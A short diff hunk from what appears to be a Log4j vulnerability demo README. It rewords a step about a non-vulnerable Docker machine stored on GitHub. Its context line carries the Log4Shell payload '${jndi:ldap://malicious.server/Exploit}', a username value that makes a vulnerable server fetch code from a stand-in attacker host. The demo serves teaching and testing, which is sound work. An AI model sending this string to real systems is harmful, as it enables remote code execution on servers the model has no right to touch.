@@ -137,6 +137,6 @@ Username: ${jndi:ldap://malicious.server/Exploit}
 
     Command: docker run --network host  &#60;Image_name&#62;
 
-7) For the sake of this demo, I have already created and stored in my github.
+7) For the sake of this demo, I have already created a non vulnerable machine and stored in my github.
 
     Non Vuln machine: https://github.com/sudesh0sudesh/Log4jDemo_nonvuln
